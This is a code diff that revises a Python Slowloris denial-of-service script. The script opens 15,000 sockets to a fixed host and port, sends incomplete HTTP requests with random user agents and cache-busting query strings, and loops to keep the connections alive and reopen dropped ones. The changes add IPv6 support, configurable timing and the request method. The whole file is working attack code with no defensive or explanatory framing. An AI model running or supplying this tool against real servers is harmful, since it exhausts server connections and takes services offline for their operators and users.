@@ -4,68 +4,66 @@ import time
 
 from agents import random_agent
 
-host = "10.0.1.245"
-method = 'GET'
-url = '/'
-port = 8080
-timing = 10
+host : str = "10.0.1.245"
+method : str = 'GET'
+url : str = '/'
+port : int = 8080
+timing : int = 10
+prevent_cache : bool = True
 
 def send_line(s, data):
-    s.send(bytes(f"{data}\r\n", 'utf8'))
+    s.send(bytes(f"{data}\n", 'utf8'))
 
 def send_header(s, header, value):
     send_line(s, f"{header}: {value}")
 
-def create_socket(host, port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def create_socket(host, port, prevent_cache, method, url):
+    ipversion = socket.AF_INET6 if ':' in host else socket.AF_INET # Auto-determine internet protocol version
+
+    # Open TCP socket
+    s = socket.socket(ipversion, socket.SOCK_STREAM) 
     s.connect((host, port))
     
-    send_line(s, f"GET /?{random.randint(0, 1000000)} HTTP/1.1")
-    send_header(s, "User-Agent", random_agent())
+    # Send preliminary headers
+    rand = ( '?' + str(random.randint(0, 65554)) ) if prevent_cache else ''
+    send_line(s, f"{method} {url}{rand} HTTP/1.1") # Most frameworks require a correct start-line
+    send_header(s, "User-Agent", random_agent()) # Some frameworks require an immediate user-agent definition
     return s
 
-
-
-def loris(n, host, port, timing):
+def loris(host, port, n, *, timing, prevent_cache, url):
     # Open sockets
     print("Opening initial connections:", n)
     sockets = []
     for _ in range(n):
-        sockets.append( create_socket(host, port) )
-        print("\rOpen: %s" % len(sockets), end='')
+        sockets.append( create_socket(host, port, prevent_cache, method, url) )
+        print("\r-> %s" % len(sockets), end='')
 
     print()
     print("Initial sockets opened.")
+    print("Looping keep alive..")
 
     # Loop keepalive
+    iteration = 0
     while True:
+        # Send keep alive packets
         for s in sockets:
             try:
-                send_header(s, "X-Key", 'none')
+                send_header(s, f'X-Key-{iteration}', f'a{iteration}')
             except:
                 sockets.remove(s)
 
         print(f"Alive: {len(sockets)}/{n}")
 
-        for _ in range(n - len(sockets)):
-            sockets.append( create_socket(host, port) )
-
-        time.sleep(3)
+        revive = n - len(sockets)
+        if revive > 0:
+            print(f"Reviving {revive} connections..")
+            for _ in range(n - len(sockets)):
+                sockets.append( create_socket(host, port, prevent_cache, method, url) )
+                print("\r-> %s" % len(sockets), end='')
+            print()
+            
+        iteration += 1
+        time.sleep(timing)
         
 if __name__ == '__main__':
-    #loris(1500, host, port, timing)
-    loris(15000, host, port, timing)
-
-    pass
-
-    s = create_socket(host, port)
-    time.sleep(3)
-    send_header(s, 'Accept', 'text/html')
-    time.sleep(3)
-    send_header(s, 'Accept-Encoding', '*')
-    time.sleep(3)
-    #send_header(s, f"X-Key-{rand_str(16)}", random.randint(0, 65554))
-    print(s.recv(1024))
-    print('sent')
-    #time.sleep(1)
-        
+    loris(host, port, 15_000, timing=timing, prevent_cache=prevent_cache, url=url)
